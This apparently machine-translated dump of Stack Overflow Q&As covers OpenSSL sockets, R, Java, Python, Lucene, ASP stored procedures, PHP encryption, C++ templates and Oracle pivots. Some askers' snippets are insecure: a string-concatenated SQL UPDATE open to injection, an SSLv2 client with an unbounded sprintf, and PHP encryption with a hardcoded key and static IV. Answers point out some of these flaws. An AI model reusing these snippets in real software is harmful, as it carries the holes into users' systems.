    background-image:url("http://wallpapers.free-review.net/wallpapers/42/Sun_in_white_cloud.jpg");
}
.door {
    height:70px;
    width:50px;
    background-color:rgba(0, 0, 255, 0.4);
    border-left: 175px solid orange;
    border-top: 10px solid orange;
    border-right: 10px solid orange;
    border-bottom: 230px solid orange;
    border-image:url("http://roundsquarewoodworking.com/wp-content/uploads/2010/07/wood-texture-background.jpg") 25% repeat;
} 
```

[JSF](http://jsfiddle.net/X8Zc5/1/)中。

**编辑**

更新代码以查看“透视”效果。边界并不完美，但我希望你能明白。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-26T15:16:29.130

我建议使用 canvas html5。[http://www.html5canvastutorials.com](http://www.html5canvastutorials.com)

# c++ - 使用 OPENSSL 的客户端-服务器通信（使用证书）

> ID：15092589
> 
> 赞同：2
> 
> 时间：2013-02-26T15:13:05.560
> 
> 标签：c++, linux, openssl

我正在使用[http://simplestcodings.blogspot.com.br/2010/08/secure-server-client-using-openssl-in-c.html](http://simplestcodings.blogspot.com.br/2010/08/secure-server-client-using-openssl-in-c.html)生成使用 OPENSSL 相互通信的客户端服务器。

我使用与站点中提到的相同方式生成证书，然后我成功运行了服务器部分。

我也做了客户端部分。但是当我运行时，我在下面提到了几个错误（来自服务器端）。

**用法：5000 LoadCertificates 成功完成..... 139761812350824：错误：140C5042：SSL 例程：SSL_UNDEFINED_FUNCTION：调用了您不应调用的函数：ssl_lib.c:2421：连接：127.0.0.1:57320 139761812350824：错误：140C5042：例程：SSL_UNDEFINED_FUNCTION：调用了一个你不应该调用的函数：ssl_lib.c：2421：139761812350824：错误：140C5042：SSL 例程：SSL_UNDEFINED_FUNCTION：调用了一个你不应该调用的函数：ssl_lib.c：2421：139761812350824：错误：140780E5：SSL例程：SSL23_READ：ssl 握手失败：s23_lib.c:138：连接：127.0.0.1:57402 没有证书。**

我的代码稍作修改......

**//客户**

```
#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <malloc.h>
#include <string.h>
#include <sys/socket.h>
#include <resolv.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define FAIL    -1

int OpenConnection(const char *hostname, int port)
{   int sd;
struct hostent *host;
struct sockaddr_in addr;

if ( (host = gethostbyname(hostname)) == NULL )
{
    printf('Eroor: %s\n',hostname);
    perror(hostname);
    abort();
}
sd = socket(PF_INET, SOCK_STREAM, 0);
bzero(&addr, sizeof(addr));
addr.sin_family = AF_INET;
addr.sin_port = htons(port);
addr.sin_addr.s_addr = *(long*)(host->h_addr);
if ( connect(sd, (struct sockaddr*)&addr, sizeof(addr)) != 0 )
{
    close(sd);
    perror(hostname);
    abort();
}
return sd;
}

SSL_CTX* InitCTX(void)
{   SSL_METHOD *method;
SSL_CTX *ctx;

OpenSSL_add_all_algorithms();  /* Load cryptos, et.al. */
SSL_load_error_strings();   /* Bring in and register error messages */
method = SSLv2_client_method();  /* Create new client-method instance */
ctx = SSL_CTX_new(method);   /* Create new context */
if ( ctx == NULL )
{
    ERR_print_errors_fp(stderr);
    printf('Eroor: %s\n',stderr);
    abort();
}
return ctx;
}

void ShowCerts(SSL* ssl)
{   X509 *cert;
    char *line;

    cert = SSL_get_peer_certificate(ssl); /* get the server's certificate */
    if ( cert != NULL )
    {
    printf("Server certificates:\n");
    line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
    printf("Subject: %s\n", line);
    free(line);       /* free the malloc'ed string */
    line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
    printf("Issuer: %s\n", line);
    free(line);       /* free the malloc'ed string */
    X509_free(cert);     /* free the malloc'ed certificate copy */
}
else
    printf("No certificates.\n");
}

int main(int count, char *strings[])
{   SSL_CTX *ctx;
int server;
SSL *ssl;
char buf[1024];
int bytes;
char *hostname, *portnum;

if ( count != 3 )
{
    printf("usage: %s <hostname> <portnum>\n", strings[0]);
    exit(0);
}

SSL_library_init();
hostname=strings[1];
portnum=strings[2];

ctx = InitCTX();
server = OpenConnection(hostname, atoi(portnum));
ssl = SSL_new(ctx);      /* create new SSL connection state */
SSL_set_fd(ssl, server);    /* attach the socket descriptor */
if ( SSL_connect(ssl) == FAIL )   /* perform the connection */
{
    printf('Eroor: %s\n',stderr);
    ERR_print_errors_fp(stderr);
}
else
{   char *msg = "Hello???";

    printf("Connected with %s encryption\n", SSL_get_cipher(ssl));
    ShowCerts(ssl);        /* get any certs */
    SSL_write(ssl, msg, strlen(msg));   /* encrypt & send message */
    bytes = SSL_read(ssl, buf, sizeof(buf)); /* get reply & decrypt */
    buf[bytes] = 0;
    printf("Received: \"%s\"\n", buf);
    SSL_free(ssl);        /* release connection state */
}
close(server);         /* close socket */
SSL_CTX_free(ctx);        /* release context */
return 0;
} 
```

* * *

```
#include <errno.h>
#include <unistd.h>
#include <malloc.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <resolv.h>
#include "openssl/ssl.h"
#include "openssl/err.h"

#define FAIL    -1
using namespace std;

int OpenListener(int port)
{   int sd;
struct sockaddr_in addr;

sd = socket(PF_INET, SOCK_STREAM, 0);
bzero(&addr, sizeof(addr));
addr.sin_family = AF_INET;
addr.sin_port = htons(port);
addr.sin_addr.s_addr = INADDR_ANY;
if ( bind(sd, (struct sockaddr*)&addr, sizeof(addr)) != 0 )
{
    perror("can't bind port");
    abort();
}
if ( listen(sd, 10) != 0 )
{
    perror("Can't configure listening port");
    abort();
}
return sd;
}

SSL_CTX* InitServerCTX(void)
{
SSL_CTX *ctx = NULL;

    #if OPENSSL_VERSION_NUMBER >= 0x10000000L
           const SSL_METHOD *method;
    #else
            SSL_METHOD *method;
    #endif

    SSL_library_init();
    OpenSSL_add_all_algorithms();  /* load & register all cryptos, etc. */
    SSL_load_error_strings();   /* load all error messages */

    method = SSLv23_client_method(); /* create new server-method instance */
    ctx = SSL_CTX_new(method);   /* create new context from method */
    if ( ctx == NULL )
    {
        ERR_print_errors_fp(stderr);
        abort();
    }
    return ctx;
}

void LoadCertificates(SSL_CTX* ctx, char* CertFile, char* KeyFile)
{
//New lines
    if (SSL_CTX_load_verify_locations(ctx, CertFile, KeyFile) != 1)
        ERR_print_errors_fp(stderr);

    if (SSL_CTX_set_default_verify_paths(ctx) != 1)
        ERR_print_errors_fp(stderr);
    //End new lines
/* set the local certificate from CertFile */
if ( SSL_CTX_use_certificate_file(ctx, CertFile, SSL_FILETYPE_PEM) <= 0 )
{
    ERR_print_errors_fp(stderr);
    abort();
}
/* set the private key from KeyFile (may be the same as CertFile) */
if ( SSL_CTX_use_PrivateKey_file(ctx, KeyFile, SSL_FILETYPE_PEM) <= 0 )
{
    ERR_print_errors_fp(stderr);
    abort();
}
/* verify private key */
if ( !SSL_CTX_check_private_key(ctx) )
{
    fprintf(stderr, "Private key does not match the public certificate\n");
    abort();
}
printf("LoadCertificates Compleate Successfully.....\n");
}

void ShowCerts(SSL* ssl)
{   X509 *cert;
char *line;

cert = SSL_get_peer_certificate(ssl); /* Get certificates (if available) */
if ( cert != NULL )
{
    printf("Server certificates:\n");
    line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
    printf("Subject: %s\n", line);
    free(line);
    line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
    printf("Issuer: %s\n", line);
    free(line);
    X509_free(cert);
}
else
    printf("No certificates.\n");
}

void Servlet(SSL* ssl) /* Serve the connection -- threadable */
{   char buf[1024];
char reply[1024];
int sd, bytes;
const char* HTMLecho="<html><body><pre>%s</pre></body></html>\n\n";

if ( SSL_accept(ssl) == FAIL )     /* do SSL-protocol accept */
    ERR_print_errors_fp(stderr);
else
{
    ShowCerts(ssl);        /* get any certificates */
    bytes = SSL_read(ssl, buf, sizeof(buf)); /* get request */
    if ( bytes > 0 )
    {
        buf[bytes] = 0;
        printf("Client msg: \"%s\"\n", buf);
        sprintf(reply, HTMLecho, buf);   /* construct reply */
        SSL_write(ssl, reply, strlen(reply)); /* send reply */
    }
    else
        ERR_print_errors_fp(stderr);
}
sd = SSL_get_fd(ssl);       /* get socket connection */
SSL_free(ssl);         /* release SSL state */
close(sd);          /* close connection */
}

int main(int count, char *strings[])
{   SSL_CTX *ctx;
int server;
char *portnum;

if ( count != 2 )
{
    printf("Usage: %s <portnum>\n", strings[0]);
    exit(0);
}
else
{
    printf("Usage: %s <portnum>\n", strings[1]);
}
SSL_library_init();

portnum = strings[1];
ctx = InitServerCTX();        /* initialize SSL */
LoadCertificates(ctx, "/home/stud/kawsar/mycert.pem", "/home/stud/kawsar/mycert.pem");  /* load certs */
server = OpenListener(atoi(portnum));    /* create server socket */
while (1)
{   struct sockaddr_in addr;
    socklen_t len = sizeof(addr);
    SSL *ssl;

    int client = accept(server, (struct sockaddr*)&addr, &len);  /* accept connection   as usual */
    printf("Connection: %s:%d\n",inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));
    ssl = SSL_new(ctx);              /* get new SSL state with context */
    SSL_set_fd(ssl, client);      /* set connection socket to SSL state */
    Servlet(ssl);         /* service connection */
}
close(server);          /* close server socket */
SSL_CTX_free(ctx);         /* release context */
} 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-01T13:48:18.100

您在 InitServerContext 中使用了错误的方法

SSLv23_client_method。

应该是 SSLv23_method

# r - 从行名中提取数据并插入到表中

> ID：15092590
> 
> 赞同：1
> 
> 时间：2013-02-26T15:13:09.150
> 
> 标签：r

我有一个看起来像的数据框

```
 ML1    ML1 SD       ML2    ML2 SD ...
aPhysics0 0.8730469 0.3329205 0.5950521 0.4908820
aPhysics1 0.8471074 0.3598839 0.6473829 0.4777848
aPhysics2 0.8593750 0.3476343 0.7031250 0.4568810
aPhysics3 0.8875000 0.3159806 0.7000000 0.4582576
aPhysics4 0.7962963 0.4027512 0.7654321 0.4237285
... 
```

我想使用行名来创建一个看起来像的数据框

```
 Institution Subject Class       ML1    ML1 SD       ML2    ML2 SD ...
[1,]           A Physics     0 0.8730469 0.3329205 0.5950521 0.4908820
[2,]           A Physics     1 0.8471074 0.3598839 0.6473829 0.4777848
[3,]           A Physics     2 0.8593750 0.3476343 0.7031250 0.4568810
[4,]           A Physics     3 0.8875000 0.3159806 0.7000000 0.4582576
[5,]           A Physics     4 0.7962963 0.4027512 0.7654321 0.4237285
... 
```

最好的方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:18:54.500

假设你的 data.frame 是 df，

```
header <- as.data.frame(do.call(rbind, strsplit(gsub("Physics", " Physics ", 
                rownames(df)), " ")))
names(header) <- c("Institution", "Subject", "Class")
cbind(header, df)
df.out <- cbind(header, df)
df.out$Institution <- toupper(df.out$Institution) 
```

如果您有更多主题（通用解决方案）：

```
header <- as.data.frame(do.call(rbind, strsplit(gsub("^([a-z])(.*)([0-9])$", 
                 "\\1 \\2 \\3", rownames(df)), " ")))
names(header) <- c("Institution", "Subject", "Class")
df.out <- cbind(header, df)
df.out$Institution <- toupper(df.out$Institution) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-26T15:24:25.763

假设行名的格式为（1 个小写字符字符串-1 个数字），您可以使用一些正则表达式`gsub`：

```
#test data
x <- data.frame(ML1=runif(5),ML2=runif(5),row.names=paste0("aPhysics",1:5))

#logic
transform(x, Institution=toupper(gsub("^([a-z])([a-zA-Z]+)([0-9])$","\\1",rownames(x))), Subject=gsub("^([a-z])([a-zA-Z]+)([0-9])$","\\2",rownames(x)), Class=gsub("^([a-z])([a-zA-Z]+)([0-9])$","\\3",rownames(x)))
                 ML1       ML2 Institution Subject Class
aPhysics1 0.51680701 0.4102757           A Physics     1
aPhysics2 0.60388358 0.7438400           A Physics     2
aPhysics3 0.26504243 0.7598557           A Physics     3
aPhysics4 0.55900273 0.5263205           A Physics     4
aPhysics5 0.05589591 0.7903568           A Physics     5 
```

# java - 语句中的回文：Java

> ID：15092600
> 
> 赞同：1
> 
> 时间：2013-02-26T15:13:33.517
> 
> 标签：java, string, palindrome

我需要一些关于我正在为家庭作业做的回文检测器的帮助。我需要用户输入一个语句，所以不止一个词，程序需要检测哪些词是回文，哪些不是。但是，我的循环中出现了问题，它只会检测到第一个单词，然后将其他单词混合在一起。我不确定我做错了什么。

```
import javax.swing.JOptionPane;

public class Main {
   static int numpali = 0;

   public static void main(String[] args) {
      // ask the user to enter a statement
      String statement = JOptionPane.showInputDialog("Enter a Statement");
      String reverse = "";
      // Array to split the sentence
      String[] words = statement.split(" ");

      // Run a loop to seperate the words in the statement into single Strings
      for (String word : words) {
         // Print out original word
         System.out.println(word + "\n");
         int wordlength = word.length();
         // send the word to lowercase so capitals are negligible
         String wordlower = word.toLowerCase();

         // Run a loop that reverses each individual word to see if its a
         // palindrome
         for (int t = wordlength; t > 0; t--) {
            reverse += wordlower.substring(t - 1, wordlength);
            wordlength--;
         }
         System.out.println(reverse);
         // show a message if the word is a palindrome or not, and add 1 to the
         // total number of palindromes
         if (reverse.equals(wordlower)) {
            JOptionPane.showMessageDialog(null, word + " is a Palindrome!");
            numpali = numpali + 1;
         }
         word = "";
      }
      System.out.println("Number of Palindromes:" + "\n" + numpali);
   }
} 
```

我试图解释它在程序中尽我所能。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:19:47.583

您永远不会重置循环内的“反向”值。因此，在第一个单词之后，您只需添加更多字符来“反转”每次迭代。

放

```
reverse = ""; 
```

在你的主 for 循环内

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:39:41.290

将 reverse 的值重置为 reverse=""; 就像你所做的那样 word="";

# python - Python：创建随机数后，如何将这些数字与我制作的列表相关联

> ID：15092604
> 
> 赞同：-1
> 
> 时间：2013-02-26T15:13:38.773
> 
> 标签：python, loops, random, for-loop

所以基本上我需要创建一个标记为 [0,1,2,3,4,5,10,25,100] 的缓冲区列表。然后我需要在 (0.75 和 4.75)+3 之间创建随机数。现在我需要打印类似“Buffer 3 take and average of **x** seconds”之类的东西。**x**将是生成的随机数。每个缓冲区必须有自己的随机数

```
def main():
    buffer= [0,1,2,3,4,5,10,25,100]
    time= random.uniform(0.75,4.75)+3
    sum=0
    for i in range (1, 500):
        sum = sum + time;
        average= sum/1500
        for buffer in range(0,1,2,3,4,5,10,25,100):
           print("For Buffer",buffer,",the average time is",average,".") 
```

* * *

[解决了]

```
#Lab 1 using python.
Import random  #Importing random number generator.
def main():
    buffers= [0,1,2,3,4,5,10,25,100]; #Defining the buffers using list.
    for buffer in buffers:
        sum=0;

        for i in range (1, 500): # Create a loop which will create random number and increment 500 times.
            time= (random.uniform (0.75,4.75))+3
            sum = sum + time

        average= sum/500; #Finding the average of each buffers random numbers.

        print("For Buffer",buffer,",the average time is",average,"."); #Print the output. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:19:33.917

您只需要更改它，以便您的平均计算在您的 for 循环中完成。

```
buffer= [0,1,2,3,4,5,10,25,100]
    for buffer in range(0,1,2,3,4,5,10,25,100):
          sum=0
          for i in range (1, 500):
             time= random.uniform(0.75,4.75)+3
             sum = sum + time;
             average= sum/1500
          print("For Buffer",buffer,",the average time is",average,".") 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:20:22.687

您可以使用字典将每个缓冲区与其平均值相关联，该字典将缓冲区直接用作键，并将其平均值作为值。

```
def main():
    buffer= [0,1,2,3,4,5,10,25,100]
    time= random.uniform(0.75,4.75)+3
    sum=0
    dict_of_buffers = {}
    for i in range (1, 500):
        sum = sum + time;
        average= sum/1500
        for buffer in range(0,1,2,3,4,5,10,25,100):
            print("For Buffer",buffer,",the average time is",average,".")
            dict_of_buffers[buffer] = average 
```

# java - 如何使用 Lucene 构建我自己的“常用词”过滤器

> ID：15092609
> 
> 赞同：1
> 
> 时间：2013-02-26T15:13:50.070
> 
> 标签：java, search-engine, lucene

我知道 Lucene 使用*停用词*（通用）过滤器进行搜索，而且我也知道*标准分析器*或*英语分析器*负责这项工作。如果我想将自己的常用词添加到分析器过滤器中呢？如何添加计算机、互联网、系统等词？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:20:03.760

我假设“常用词”是指*stopwords*。

为了添加到标准列表，只需使用另一个构造函数`StandardAnalyzer`（它接受停用词 as`CharArraySet`或`Reader`）。要获取标准停用词集，请使用`StopAnalyzer.STOP_WORDS_SET`.

# sql - 用于 ASP 经典的 SQL Server 存储过程

> ID：15092616
> 
> 赞同：0
> 
> 时间：2013-02-26T15:14:05.187
> 
> 标签：sql, sql-server, stored-procedures, asp-classic

我正在迭代一个 html 表。

每行都有一个 id，表有 2 列/2 个属性。

这是我的循环：

```
Dim id
    Dim prop1
    Dim prop2

For Each id In Request.Form("id")
    prop1 = Request.Form(id & "_prop1")
    prop1 = Request.Form(id & "_prop2")
Next 
```

想象一下，我想更新数据库中的数据......我可能会进入那个循环

```
"UPDATE table SET prop1 = '" & prop1 & "', prop2 = '" & prop2 & "'" WHERE id = '" & id & 
"'" 
```

什么是 SQL 存储过程，我将如何为这个操作实现一个？

例如在这个链接中：[http ://www.albofish.co.uk/ms-sql-stored-procedures-and-classic-asp/](http://www.albofish.co.uk/ms-sql-stored-procedures-and-classic-asp/)

我看不到您要更新的表的参考...我只是不明白。d'oh

用这个例子：[http ://www.ehow.com/way_5901555_tutorial-sql-stored-procedures.html](http://www.ehow.com/way_5901555_tutorial-sql-stored-procedures.html)

我看不到如何将表单值放入程序中？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-26T15:38:41.253

存储过程存在于您的后端数据库中，而不是您的 ASP 代码中。您发布的链接中可能让您感到困惑的是，它包含用于执行*服务器端过程的**客户端*代码，未显示。

 *在您的情况下，实际的存储过程本身看起来像这样：

```
CREATE PROCEDURE dbo.MyProcedure
(
   @prop1 varchar(255), --Fill in appropriate data types if necessary
   @prop2 varchar(255),
   @id int
)
AS
  SET NOCOUNT ON;

  UPDATE table
  SET prop1 = @prop1,
      prop2 = @prop2
  WHERE id = @id; 
```

（@sgeddes 是正确的，该过程应该包括`SET NOCOUNT ON`. 我已将其添加到我的示例中。）

然后，您将使用以下客户端代码来调用该过程（我已从您的链接中编辑了代码以使其更易于理解）。

```
'Create ADO command
Set cmd = Server.CreateObject("ADODB.Command")
With cmd
   'Set up DB connection to use, set the type of SQL command
   .ActiveConnection = db
   .CommandType = adCmdStoredProc
   .CommandText = "dbo.MyProcedure" ' Set the name of the Stored Procedure to use

   'Add a 255 character varchar parameter
   .Parameters.Append .CreateParameter("@prop1",adVarChar, adParamInput, 255)
   .Parameters("@prop1") = "Prop 1 Value"

   'Add a 255 character varchar parameter
   .Parameters.Append .CreateParameter("@prop2",adVarChar, adParamInput, 255)
   .Parameters("@prop2") = "Prop 2 Value"

   'Add a integer parameter, then pass the value of the variable userID to it
   .Parameters.Append .CreateParameter("@id",adInteger, adParamInput)
   .Parameters("@id") = userID

   'Execute the command
   .Execute
End With

'Clean up
set cmd = nothing 
```

这显然比你现在拥有的代码要多得多。那你为什么要这么做？最重要的原因是安全。通过创建参数化过程并在参数中传递值，您可以大大降低任何类型的 SQL 注入攻击的可能性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:36:33.593

SQL 存储过程与 ASP 函数不同——存储过程是您在数据库中创建的东西。语法因您的 RDBMS 而异。但是这样的事情：

```
CREATE PROCEDURE UpdateYourTable
    @id int, 
    @prop1 nvarchar(50).
    @prop2 nvarchar(50)
AS 

    SET NOCOUNT ON;

    UPDATE table 
    SET prop1 = @prop1, prop2 = @prop2 
    WHERE id = @id

GO 
```

然后，您将通过您的代码调用此存储过程，就像您发布的文章一样。*

# php - 在 AS3 中转义的 PHP 中的非转义字符串

> ID：15092617
> 
> 赞同：1
> 
> 时间：2013-02-26T15:14:07.620
> 
> 标签：php, javascript, actionscript-3, utf-8

我有个问题。我有使用`escape()`函数在 AS3 中转义的 UTF-8 字符串。现在我想在 PHP 中对它们进行转义。问题是，如果我正在使用`rawurldecode()`或者`urldecode()`我只得到未转义的常见字符，例如 ./+[] 等，而不是特殊的拉丁字符（在我的情况下为 ĄČĘĖĮŠŲŪŽ） - 它们被留下编码。那么如何正确解码 PHP 中的字符串呢？

**编辑** 这也适用于 JavaScript。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T17:02:42.043

当您将字符串发送到 PHP 时，您不必转义它们。Flash 为您做到这一点。

因此，如果它们已经被转义并且您可以对此做任何事情，只需在使用 URLLoader 发送它们之前取消转义它们。

你应该在 PHP 端有干净的值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T18:14:12.673

好的，我从同事那里得到了解决方案，它解决了这个问题

```
html_entity_decode(preg_replace("/%u([0-9a-f]{3,4})/i","&#x\\1;", urldecode($str)), null, 'UTF-8'); 
```

# php - Objective-C 版本的 PHP mcrypt_encrypt

> ID：15092619
> 
> 赞同：1
> 
> 时间：2013-02-26T15:14:12.457
> 
> 标签：php, ios, encryption, mcrypt

通过四处搜索，我可以找到许多引用类似问题的链接，但没有什么是有效的，它让我发疯....

有人可以给我一个关于如何在Objective C中编写以下PHP代码的分步指南。

我们正在创建一些需要加密内容的 Web 服务调用，并且我们只获得了 PHP 加密示例。明确地说，我们不想取消加密，我们想在 IOS 中镜像这个加密过程。

非常感谢

```
function encrypt($plainText) {

      $initVector = "mysite.com";      
      $key = base64_decode("GfSDfXS14U8I3YglEFrMjMOOnESUMxN3wRTt1TeDosY=");

      $block = mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
      $padding = $block - (strlen($plainText) % $block);
      $plainText .= str_repeat(chr($padding), $padding);
      $crypttext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $plainText, MCRYPT_MODE_CBC, $initVector);
      $crypttext64 = base64_encode($crypttext);

      return $crypttext64;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T21:24:12.230

这*非常*接近于在 PHP 中使用 AES 正确执行的 CBC 模式加密 :) 对于静态的、太短的 IV 以及尚未指定字符编码的事实（如果`plainText`是字符串而不是字节）。

否则，这看起来很像使用 CBC 模式和 PKCS#7 填充的 AES-256，因此您可以在 Objective-C 中使用任何示例来精确执行它。当然，您还需要一个 base 64 解码器。

但是，您应该生成一个随机 IV 并将其作为密文的前缀（安全随机，这在 PHP 中很棘手）。IV 的大小应与底层密码的块大小相同，在 AES 的情况下为 16 个字节。然后解密函数应该从密文中删除这些字节并将它们用作IV。

研究完整性保护（消息身份验证代码或 MAC）也是一个非常好的主意。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T18:23:20.057

在苹果开发论坛上得到了回答。

[https://devforums.apple.com/message/791166#791166](https://devforums.apple.com/message/791166#791166)

PHP 使用古怪的加密 IMO，尽管代码似乎在尽力避免古怪（例如，AFAICT 填充代码实现 PKCS#7 填充）。您看到的问题很可能与 PHP 如何将字符串“mysite.com”转换为有效的 AES-128 IV（其长度必须与块大小匹配，即 16 个字节）有关。PHP 很可能用零填充（这似乎是 PHP 的方式），但您必须在 PHP 方面进行研究。

除此之外，这看起来像是 Common Crypto 的一个相当普遍的应用。你需要：

o 传入 kCCOptionPKCS7Padding 标志

o 不传入 kCCOptionECBMode 标志（所以你得到 CBC）

o 使用 kCCAlgorithmAES128、kCCKeySizeAES128 和 kCCBlockSizeAES128

o 做你自己的 Base64 [1]

关于最后一点，我建议你最后这样做。修改 PHP 代码以将 $key、$plainText 和 $crypttext 打印为十六进制转储，然后在 iOS 端使用它们。一旦工作正常，然后添加 Base64。这将问题分成两半，这意味着 Base64 问题不会与您的加密问题混为一谈。

最后，请记住 OS X 在命令行上有一个方便的 Base64 编码器和解码器。例如，要获取示例中加密密钥的十六进制转储，您可以执行以下操作：

$ openssl enc -d -base64 | hexdump -C GfSDfXS14U8I3YglEFrMjMOOnESUMxN3wRTt1TeDosY= ^D 00000000 19 f4 83 7d 74 b5 e1 4f 08 dd 88 25 10 5a cc 8c |...}t..O...%.Z..| 00000010 c3 8e 9c 44 94 33 13 77 c1 14 ed d5 37 83 a2 c6 |...D.3.w....7...| 00000020

分享和享受

感谢爱斯基摩人1

# c++ - 调用模板类的模板成员函数时看起来错误的编译错误

> ID：15092621
> 
> 赞同：1
> 
> 时间：2013-02-26T15:14:18.207
> 
> 标签：c++, templates, gcc

我有一个模板化的 C++ 类，在其成员函数之一上有一个进一步的模板。

我在我的代码中的两个地方调用它，其中一个有效，另一个生成一个非常令人困惑的错误，归结为下面的示例代码：

```
#include <memory>

template <unsigned char N>
struct Foo
{
    template <typename OtherFoo, unsigned X>
    void do_work (
        const OtherFoo * __restrict,
        float,
        Foo * __restrict
        )
    const
    {
    }
};

struct Bar
{
    std :: unique_ptr <Foo<0>> foo_0;
    std :: unique_ptr <Foo<1>> foo_1;
    std :: unique_ptr <Foo<2>> foo_2;

    void run (float);

    template <typename FOO>
    void run (std :: unique_ptr <FOO> & foo, float x)
    {
        FOO out;
        foo -> template do_work <123> (foo_2.get(), x, &out);
    }
};

void Bar :: run (float x)
{
    if (foo_0)
        run (foo_0, x);
    else
        run (foo_1, x);
}

int main ()
{
    Bar bar;
    bar .run (1.23);
} 
```

错误消息非常简单，但显然是错误的。

```
temp.cpp: In member function ‘void Bar::run(std::unique_ptr<FOO>&, float) [with FOO = Foo<0u>]’:
temp.cpp:61:16:   instantiated from here
temp.cpp:54:3: error: no matching function for call to ‘Foo<0u>::do_work(Foo<2u>*, float&, Foo<0u>*)’
temp.cpp: In member function ‘void Bar::run(std::unique_ptr<FOO>&, float) [with FOO = Foo<1u>]’:
temp.cpp:63:16:   instantiated from here
temp.cpp:54:3: error: no matching function for call to ‘Foo<1u>::do_work(Foo<2u>*, float&, Foo<1u>*)’ 
```

让我们看看，没有匹配的函数调用`Foo<1u>::do_work(Foo<2u>*, float&, Foo<1u>*)`...？不，在我看来，这完全像 Foo:: **do_work**的有效实例化。

编译器错了吗？（ubuntu 12.04 上的 gcc 4.5.1）特别奇怪的是，这段代码确实在代码中其他地方的等效调用中编译（完整的东西有太多的依赖关系，无法在此处有意义地复制）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:18:47.293

您应该更改`do_work<>()`函数模板的模板参数的顺序，否则您的实例化确实不正确：

```
//   template<typename OtherFoo, unsigned X> // This order is not appropriate.
                                             // Let template parameters that
                                             // cannot be deduced come first...
     template<unsigned X, typename OtherFoo>
     //       ^^^^^^^^^^  ^^^^^^^^^^^^^^^^^
     //       THIS FIRST      THEN THIS
     void do_work(const OtherFoo* __restrict, float, Foo* __restrict) const
     {
     } 
```

这是因为在以下函数调用中，您为第一个模板参数提供了显式*参数*：

```
foo->template do_work<123>(foo_2.get(), x, &out); 
```

# android - Horizo ntalListView 和 SetSelection

> ID：15092622
> 
> 赞同：0
> 
> 时间：2013-02-26T15:14:20.300
> 
> 标签：android, android-layout, xamarin.android

我正在使用此处提供的 Horizo​​ntalListView：

[https://github.com/Cheesebaron/Cheesebaron.Horizo​​ntalListView](https://github.com/Cheesebaron/Cheesebaron.HorizontalListView)

我正在尝试以编程方式选择列表中的一个项目并让它显示，就像普通列表视图中的 SetSelection 一样。当我在 Horizo​​ntalListView 上尝试 SetSelection 时，它似乎不起作用。

我想知道是否有人使用过这个控件并能够让它工作？

在我查看代码之前，我正在检查是否有人以前做过这个，也许我只是错过了一些东西。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:33:36.943

当前的实现`SetSelection`仅在`Snap`为真时有效。您可以尝试设置`CurrentScreen`为您想要的屏幕，然后调用`SnapToDestination`，这可能对您有用。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2014-10-14T03:08:09.340

我找到了答案，你可以[在这里](http://gist.github.com/httpdispatch/8953995)看到，使用方法 scrollToIndex

# oracle - Oracle sql 查询：动态填充的数据透视表（高级）

> ID：15092625
> 
> 赞同：2
> 
> 时间：2013-02-26T15:14:27.253
> 
> 标签：oracle, dynamic, pivot

我需要展平一个表，但这里是棘手的部分，clomuns 是动态的，当添加包含新 ID 的新记录时，查询应该可以工作。

这是我的工作查询（简化了 IN 这实际上是数百个值）：

```
SELECT *
FROM   (select qv.respnr, sq.question_id, qv.question_value
from survey_question sq, question_values qv
where qv.question_id = sq.question_id
and sq.survey_id = 1
order by qv.respnr, page, ranked)
PIVOT (
MAX(question_value)        --<-- pivot_clause
FOR question_id          --<-- pivot_for_clause
IN (346 as c346,347 as c347)
) 
```

我想`IN (346 as c346,347 as c347)`用这样的东西替换：

```
SELECT mq.question_id
  FROM meta_question mq, survey_question sq2
 WHERE sq2.survey_id = 1
   AND mq.question_id = sq2.question_id
 ORDER BY page, ranked 
```

知道怎么做吗？

我注意到 IN 不能简单地使用 select 语句进行 fileld，所以这不起作用：

```
IN (SELECT mq.question_id
      FROM meta_question mq, survey_question sq2
     WHERE sq2.survey_id = 1
       AND mq.question_id = sq2.question_id
     ORDER BY page, ranked) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:30:29.667

SQL 中所有列的名称和类型需要在编译时知道，在这里您将不得不使用[动态 SQL](http://docs.oracle.com/cd/E11882_01/appdev.112/e25519/dynamic.htm#CACDDACH)，因为您希望列数*根据数据*而变化。

如果您使用 PL/SQL，则可以使用[ref cursor](http://docs.oracle.com/cd/E11882_01/appdev.112/e25519/dynamic.htm#i13057)：

```
DECLARE
   l_rc            SYS_REFCURSOR;
   l_dynamic_query VARCHAR2(32000);
BEGIN
   FOR cc IN (SELECT mq.question_id
                FROM meta_question mq, survey_question sq2
               WHERE sq2.survey_id = 1
                 AND mq.question_id = sq2.question_id
